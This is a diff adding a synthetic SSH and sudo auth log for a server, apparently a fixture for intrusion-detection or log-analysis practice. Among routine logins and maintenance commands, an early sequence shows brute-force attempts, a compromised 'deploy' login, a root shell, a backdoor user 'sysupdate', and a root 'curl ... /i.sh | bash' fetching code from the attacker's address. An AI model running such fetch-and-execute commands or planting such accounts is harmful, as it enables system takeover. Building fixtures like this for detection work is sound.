@@ -1,0 +1,186 @@
+Nov 10 02:10:00 web01 sshd[4100]: Failed password for invalid user admin from 198.51.100.23 port 42188 ssh2
+Nov 10 02:11:20 web01 sshd[4100]: Failed password for invalid user test from 198.51.100.23 port 58717 ssh2
+Nov 10 02:12:36 web01 sshd[4100]: Failed password for invalid user oracle from 198.51.100.23 port 61005 ssh2
+Nov 10 02:13:38 web01 sshd[4100]: Failed password for invalid user postgres from 198.51.100.23 port 42385 ssh2
+Nov 10 02:15:03 web01 sshd[4100]: Failed password for invalid user ubuntu from 198.51.100.23 port 47123 ssh2
+Nov 10 03:14:00 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 45680 ssh2
+Nov 10 03:14:07 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 54158 ssh2
+Nov 10 03:14:10 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 59344 ssh2
+Nov 10 03:14:15 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 55947 ssh2
+Nov 10 03:14:23 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 49297 ssh2
+Nov 10 03:14:27 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 46566 ssh2
+Nov 10 03:14:34 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 56174 ssh2
+Nov 10 03:14:38 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 53940 ssh2
+Nov 10 03:14:44 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 62138 ssh2
+Nov 10 03:14:49 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 57841 ssh2
+Nov 10 03:14:53 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 55799 ssh2
+Nov 10 03:15:01 web01 sshd[5200]: Failed password for deploy from 203.0.113.77 port 42382 ssh2
+Nov 10 03:15:26 web01 sshd[5301]: Accepted password for deploy from 203.0.113.77 port 51022 ssh2
+Nov 10 03:17:26 web01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Nov 10 03:18:26 web01 useradd[5400]: new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash
+Nov 10 03:19:26 web01 sudo: deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.77/i.sh | bash
+Nov 10 08:00:51 web01 sshd[32483]: Accepted publickey for ivanov from 10.0.12.37 port 52554 ssh2
+Nov 10 08:01:01 web01 sshd[25982]: Accepted publickey for ivanov from 10.0.12.38 port 53831 ssh2
+Nov 10 08:24:09 web01 sshd[25870]: Accepted publickey for ivanov from 10.0.12.28 port 42605 ssh2
+Nov 10 08:31:43 web01 sshd[42744]: Accepted publickey for monitoring from 10.0.12.32 port 56877 ssh2
+Nov 10 08:39:42 web01 sshd[28101]: Accepted publickey for ivanov from 10.0.12.12 port 41311 ssh2
+Nov 10 08:40:00 web01 sshd[52916]: Accepted publickey for deploy from 10.0.12.34 port 55362 ssh2
+Nov 10 08:40:42 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 08:43:24 web01 sshd[23020]: Accepted publickey for monitoring from 10.0.12.22 port 59150 ssh2
+Nov 10 08:44:28 web01 sshd[53548]: Accepted publickey for deploy from 10.0.12.33 port 43349 ssh2
+Nov 10 08:51:15 web01 sshd[18567]: Accepted publickey for monitoring from 10.0.12.12 port 42323 ssh2
+Nov 10 08:57:22 web01 sshd[14065]: Accepted publickey for monitoring from 10.0.12.27 port 57576 ssh2
+Nov 10 09:08:49 web01 sshd[56769]: Accepted publickey for ivanov from 10.0.12.24 port 52528 ssh2
+Nov 10 09:09:03 web01 sshd[29056]: Accepted publickey for petrova from 10.0.12.37 port 41730 ssh2
+Nov 10 09:10:10 web01 sshd[12019]: Accepted publickey for deploy from 10.0.12.26 port 61240 ssh2
+Nov 10 09:11:49 web01 sshd[41612]: Failed password for monitoring from 10.0.12.33 port 43251 ssh2
+Nov 10 09:12:02 web01 sshd[41612]: Accepted publickey for monitoring from 10.0.12.33 port 63417 ssh2
+Nov 10 09:13:02 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 09:18:15 web01 sshd[39008]: Accepted publickey for monitoring from 10.0.12.14 port 43416 ssh2
+Nov 10 09:19:02 web01 sshd[49012]: Accepted publickey for monitoring from 10.0.12.11 port 64091 ssh2
+Nov 10 09:20:02 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 09:27:05 web01 sshd[33745]: Accepted publickey for petrova from 10.0.12.10 port 64399 ssh2
+Nov 10 09:27:38 web01 sshd[8739]: Accepted publickey for monitoring from 10.0.12.39 port 49098 ssh2
+Nov 10 09:28:05 web01 sudo: petrova : TTY=pts/0 ; PWD=/home/petrova ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 09:28:38 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 09:51:35 web01 sshd[56164]: Accepted publickey for deploy from 10.0.12.11 port 42308 ssh2
+Nov 10 09:52:35 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 09:52:49 web01 sshd[18339]: Accepted publickey for ivanov from 10.0.12.21 port 53472 ssh2
+Nov 10 09:54:43 web01 sshd[28841]: Accepted publickey for deploy from 10.0.12.13 port 56473 ssh2
+Nov 10 09:59:37 web01 sshd[4193]: Accepted publickey for ivanov from 10.0.12.14 port 58861 ssh2
+Nov 10 10:00:35 web01 sshd[54701]: Accepted publickey for ivanov from 10.0.12.28 port 58686 ssh2
+Nov 10 10:02:46 web01 sshd[47177]: Accepted publickey for petrova from 10.0.12.24 port 53980 ssh2
+Nov 10 10:06:32 web01 sshd[34375]: Accepted publickey for deploy from 10.0.12.12 port 45676 ssh2
+Nov 10 10:07:32 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 10:08:49 web01 sshd[47907]: Accepted publickey for petrova from 10.0.12.38 port 50150 ssh2
+Nov 10 10:23:35 web01 sshd[29767]: Accepted publickey for deploy from 10.0.12.12 port 43536 ssh2
+Nov 10 10:32:49 web01 sshd[20576]: Accepted publickey for petrova from 10.0.12.19 port 58098 ssh2
+Nov 10 10:33:49 web01 sshd[4678]: Accepted publickey for petrova from 10.0.12.23 port 51951 ssh2
+Nov 10 10:34:12 web01 sshd[39386]: Accepted publickey for deploy from 10.0.12.19 port 62397 ssh2
+Nov 10 10:34:22 web01 sshd[57079]: Accepted publickey for monitoring from 10.0.12.23 port 46846 ssh2
+Nov 10 10:34:58 web01 sshd[21713]: Accepted publickey for ivanov from 10.0.12.34 port 60431 ssh2
+Nov 10 10:36:54 web01 sshd[8727]: Accepted publickey for ivanov from 10.0.12.18 port 54728 ssh2
+Nov 10 10:44:05 web01 sshd[46148]: Accepted publickey for monitoring from 10.0.12.30 port 49974 ssh2
+Nov 10 10:45:05 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 10:52:55 web01 sshd[8004]: Accepted publickey for deploy from 10.0.12.19 port 59722 ssh2
+Nov 10 10:53:55 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 11:03:37 web01 sshd[29080]: Accepted publickey for petrova from 10.0.12.21 port 58358 ssh2
+Nov 10 11:07:45 web01 sshd[45656]: Accepted publickey for petrova from 10.0.12.32 port 43486 ssh2
+Nov 10 11:08:45 web01 sudo: petrova : TTY=pts/0 ; PWD=/home/petrova ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 11:16:49 web01 sshd[30274]: Accepted publickey for ivanov from 10.0.12.31 port 57998 ssh2
+Nov 10 11:17:48 web01 sshd[34153]: Accepted publickey for deploy from 10.0.12.29 port 52062 ssh2
+Nov 10 11:17:49 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 11:23:05 web01 sshd[50367]: Accepted publickey for deploy from 10.0.12.12 port 61365 ssh2
+Nov 10 11:32:26 web01 sshd[24382]: Accepted publickey for monitoring from 10.0.12.36 port 40051 ssh2
+Nov 10 11:34:58 web01 sshd[34670]: Accepted publickey for petrova from 10.0.12.22 port 58933 ssh2
+Nov 10 11:40:51 web01 sshd[35334]: Accepted publickey for monitoring from 10.0.12.17 port 52940 ssh2
+Nov 10 11:43:02 web01 sshd[35638]: Accepted publickey for monitoring from 10.0.12.32 port 60092 ssh2
+Nov 10 11:56:21 web01 sshd[5907]: Accepted publickey for deploy from 10.0.12.12 port 57144 ssh2
+Nov 10 12:04:54 web01 sshd[20521]: Accepted publickey for ivanov from 10.0.12.19 port 53637 ssh2
+Nov 10 12:06:16 web01 sshd[29288]: Accepted publickey for petrova from 10.0.12.29 port 40682 ssh2
+Nov 10 12:07:16 web01 sudo: petrova : TTY=pts/0 ; PWD=/home/petrova ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 12:15:21 web01 sshd[41068]: Accepted publickey for ivanov from 10.0.12.27 port 59528 ssh2
+Nov 10 12:16:21 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 12:25:36 web01 sshd[41137]: Accepted publickey for monitoring from 10.0.12.15 port 55925 ssh2
+Nov 10 12:26:36 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 12:32:06 web01 sshd[24276]: Failed password for monitoring from 10.0.12.12 port 54499 ssh2
+Nov 10 12:32:11 web01 sshd[24276]: Accepted publickey for monitoring from 10.0.12.12 port 45378 ssh2
+Nov 10 12:40:38 web01 sshd[31250]: Accepted publickey for petrova from 10.0.12.39 port 56938 ssh2
+Nov 10 12:41:14 web01 sshd[5689]: Accepted publickey for ivanov from 10.0.12.39 port 61144 ssh2
+Nov 10 12:42:35 web01 sshd[52357]: Accepted publickey for ivanov from 10.0.12.22 port 64264 ssh2
+Nov 10 12:50:15 web01 sshd[53226]: Accepted publickey for deploy from 10.0.12.21 port 53191 ssh2
+Nov 10 12:57:00 web01 sshd[4987]: Accepted publickey for ivanov from 10.0.12.27 port 44224 ssh2
+Nov 10 12:58:00 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 12:58:12 web01 sshd[58673]: Accepted publickey for monitoring from 10.0.12.15 port 61169 ssh2
+Nov 10 12:59:12 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 13:02:01 web01 sshd[20369]: Accepted publickey for ivanov from 10.0.12.35 port 50493 ssh2
+Nov 10 13:14:24 web01 sshd[22446]: Accepted publickey for deploy from 10.0.12.11 port 58972 ssh2
+Nov 10 13:25:04 web01 sshd[21797]: Accepted publickey for ivanov from 10.0.12.39 port 54937 ssh2
+Nov 10 13:26:04 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 13:27:13 web01 sshd[7318]: Accepted publickey for deploy from 10.0.12.31 port 57944 ssh2
+Nov 10 13:32:57 web01 sshd[45991]: Accepted publickey for monitoring from 10.0.12.39 port 47396 ssh2
+Nov 10 13:33:57 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 13:39:55 web01 sshd[19438]: Failed password for monitoring from 10.0.12.38 port 46581 ssh2
+Nov 10 13:40:10 web01 sshd[19438]: Accepted publickey for monitoring from 10.0.12.38 port 58459 ssh2
+Nov 10 13:42:40 web01 sshd[49329]: Accepted publickey for monitoring from 10.0.12.11 port 46951 ssh2
+Nov 10 13:59:21 web01 sshd[39282]: Accepted publickey for monitoring from 10.0.12.38 port 44250 ssh2
+Nov 10 14:04:24 web01 sshd[9193]: Accepted publickey for petrova from 10.0.12.36 port 60158 ssh2
+Nov 10 14:04:36 web01 sshd[6357]: Accepted publickey for petrova from 10.0.12.28 port 51956 ssh2
+Nov 10 14:10:07 web01 sshd[45622]: Accepted publickey for monitoring from 10.0.12.15 port 64379 ssh2
+Nov 10 14:13:18 web01 sshd[53923]: Failed password for ivanov from 10.0.12.38 port 58655 ssh2
+Nov 10 14:13:23 web01 sshd[53923]: Accepted publickey for ivanov from 10.0.12.38 port 57867 ssh2
+Nov 10 14:13:28 web01 sshd[33527]: Accepted publickey for deploy from 10.0.12.20 port 47007 ssh2
+Nov 10 14:14:23 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 14:20:59 web01 sshd[50911]: Accepted publickey for monitoring from 10.0.12.39 port 48817 ssh2
+Nov 10 14:21:59 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 14:25:10 web01 sshd[9279]: Accepted publickey for deploy from 10.0.12.24 port 55989 ssh2
+Nov 10 14:32:53 web01 sshd[19622]: Accepted publickey for petrova from 10.0.12.19 port 56363 ssh2
+Nov 10 14:33:20 web01 sshd[23634]: Accepted publickey for ivanov from 10.0.12.23 port 42125 ssh2
+Nov 10 14:34:20 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 14:36:01 web01 sshd[24261]: Accepted publickey for ivanov from 10.0.12.32 port 59449 ssh2
+Nov 10 14:37:01 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 14:37:12 web01 sshd[44644]: Accepted publickey for monitoring from 10.0.12.13 port 56518 ssh2
+Nov 10 14:46:40 web01 sshd[52043]: Accepted publickey for petrova from 10.0.12.30 port 48855 ssh2
+Nov 10 14:48:45 web01 sshd[49275]: Accepted publickey for monitoring from 10.0.12.10 port 42961 ssh2
+Nov 10 14:49:45 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 14:50:13 web01 sshd[2857]: Accepted publickey for ivanov from 10.0.12.25 port 52773 ssh2
+Nov 10 14:58:24 web01 sshd[17607]: Accepted publickey for deploy from 10.0.12.27 port 50304 ssh2
+Nov 10 14:59:24 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 15:00:48 web01 sshd[18605]: Accepted publickey for deploy from 10.0.12.17 port 60473 ssh2
+Nov 10 15:01:48 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 15:18:59 web01 sshd[55891]: Accepted publickey for ivanov from 10.0.12.23 port 61046 ssh2
+Nov 10 15:19:59 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 15:28:24 web01 sshd[16449]: Accepted publickey for petrova from 10.0.12.17 port 55157 ssh2
+Nov 10 15:32:35 web01 sshd[20456]: Accepted publickey for ivanov from 10.0.12.15 port 63377 ssh2
+Nov 10 15:33:35 web01 sshd[55500]: Accepted publickey for ivanov from 10.0.12.38 port 64352 ssh2
+Nov 10 15:34:35 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 15:44:20 web01 sshd[8483]: Failed password for monitoring from 10.0.12.25 port 52666 ssh2
+Nov 10 15:44:35 web01 sshd[8483]: Accepted publickey for monitoring from 10.0.12.25 port 53792 ssh2
+Nov 10 15:59:06 web01 sshd[4626]: Accepted publickey for petrova from 10.0.12.11 port 40762 ssh2
+Nov 10 16:00:12 web01 sshd[2378]: Failed password for monitoring from 10.0.12.28 port 59845 ssh2
+Nov 10 16:00:24 web01 sshd[2378]: Accepted publickey for monitoring from 10.0.12.28 port 48532 ssh2
+Nov 10 16:00:33 web01 sshd[21782]: Accepted publickey for ivanov from 10.0.12.14 port 50668 ssh2
+Nov 10 16:01:24 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 10 16:14:48 web01 sshd[37232]: Accepted publickey for monitoring from 10.0.12.25 port 47565 ssh2
+Nov 10 16:17:22 web01 sshd[37768]: Accepted publickey for petrova from 10.0.12.22 port 55847 ssh2
+Nov 10 16:19:09 web01 sshd[17996]: Accepted publickey for monitoring from 10.0.12.36 port 55306 ssh2
+Nov 10 16:20:26 web01 sshd[24109]: Accepted publickey for deploy from 10.0.12.20 port 64534 ssh2
+Nov 10 16:25:21 web01 sshd[43445]: Accepted publickey for monitoring from 10.0.12.13 port 52530 ssh2
+Nov 10 16:25:37 web01 sshd[16908]: Accepted publickey for ivanov from 10.0.12.25 port 53247 ssh2
+Nov 10 16:26:21 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 16:29:00 web01 sshd[23195]: Accepted publickey for monitoring from 10.0.12.36 port 55918 ssh2
+Nov 10 16:30:00 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 16:30:32 web01 sshd[21492]: Failed password for deploy from 10.0.12.13 port 57415 ssh2
+Nov 10 16:30:38 web01 sshd[21492]: Accepted publickey for deploy from 10.0.12.13 port 54527 ssh2
+Nov 10 16:46:02 web01 sshd[17723]: Accepted publickey for ivanov from 10.0.12.35 port 48766 ssh2
+Nov 10 16:53:25 web01 sshd[49022]: Failed password for deploy from 10.0.12.25 port 41424 ssh2
+Nov 10 16:53:39 web01 sshd[49022]: Accepted publickey for deploy from 10.0.12.25 port 63048 ssh2
+Nov 10 16:53:47 web01 sshd[20590]: Accepted publickey for petrova from 10.0.12.15 port 45173 ssh2
+Nov 10 16:54:47 web01 sudo: petrova : TTY=pts/0 ; PWD=/home/petrova ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 17:04:28 web01 sshd[30762]: Accepted publickey for deploy from 10.0.12.25 port 64301 ssh2
+Nov 10 17:21:34 web01 sshd[10722]: Accepted publickey for petrova from 10.0.12.10 port 47246 ssh2
+Nov 10 17:21:45 web01 sshd[40973]: Accepted publickey for petrova from 10.0.12.18 port 61654 ssh2
+Nov 10 17:22:45 web01 sudo: petrova : TTY=pts/0 ; PWD=/home/petrova ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Nov 10 17:24:11 web01 sshd[28967]: Accepted publickey for petrova from 10.0.12.18 port 58661 ssh2
+Nov 10 17:34:59 web01 sshd[59770]: Accepted publickey for ivanov from 10.0.12.24 port 41499 ssh2
+Nov 10 17:37:37 web01 sshd[12164]: Accepted publickey for monitoring from 10.0.12.30 port 47436 ssh2
+Nov 10 17:49:57 web01 sshd[24319]: Accepted publickey for monitoring from 10.0.12.31 port 57747 ssh2
+Nov 10 17:50:39 web01 sshd[40312]: Failed password for deploy from 10.0.12.24 port 47523 ssh2
+Nov 10 17:50:49 web01 sshd[40312]: Accepted publickey for deploy from 10.0.12.24 port 58047 ssh2
+Nov 10 17:50:57 web01 sudo: monitoring : TTY=pts/0 ; PWD=/home/monitoring ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 18:04:45 web01 sshd[41020]: Accepted publickey for deploy from 10.0.12.33 port 64648 ssh2
+Nov 10 18:05:45 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov 10 18:22:48 web01 sshd[9119]: Accepted publickey for deploy from 10.0.12.10 port 54730 ssh2
+Nov 10 18:28:24 web01 sshd[18561]: Accepted publickey for deploy from 10.0.12.30 port 61024 ssh2
+Nov 10 18:30:14 web01 sshd[37726]: Accepted publickey for monitoring from 10.0.12.20 port 63862 ssh2
+Nov 10 18:34:31 web01 sshd[48544]: Failed password for petrova from 10.0.12.12 port 44358 ssh2
+Nov 10 18:34:41 web01 sshd[48544]: Accepted publickey for petrova from 10.0.12.12 port 45457 ssh2
+Nov 10 18:53:17 web01 sshd[46392]: Accepted publickey for ivanov from 10.0.12.29 port 47276 ssh2
+Nov 10 19:10:55 web01 sshd[48726]: Accepted publickey for monitoring from 10.0.12.28 port 48584 ssh2
+Nov 10 19:39:32 web01 sshd[14133]: Accepted publickey for ivanov from 10.0.12.22 port 46742 ssh2
+Nov 10 19:41:08 web01 sshd[25492]: Accepted publickey for ivanov from 10.0.12.26 port 50199 ssh2
+Nov 10 19:44:47 web01 sshd[6568]: Accepted publickey for monitoring from 10.0.12.29 port 59860 ssh2
+Nov 10 19:45:19 web01 sshd[41634]: Accepted publickey for petrova from 10.0.12.24 port 46467 ssh2
+Nov 10 19:55:18 web01 sshd[22803]: Accepted publickey for ivanov from 10.0.12.33 port 63304 ssh2
+Nov 10 19:57:47 web01 sshd[49874]: Accepted publickey for ivanov from 10.0.12.25 port 61258 ssh2
+Nov 10 19:58:47 web01 sudo: ivanov : TTY=pts/0 ; PWD=/home/ivanov ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
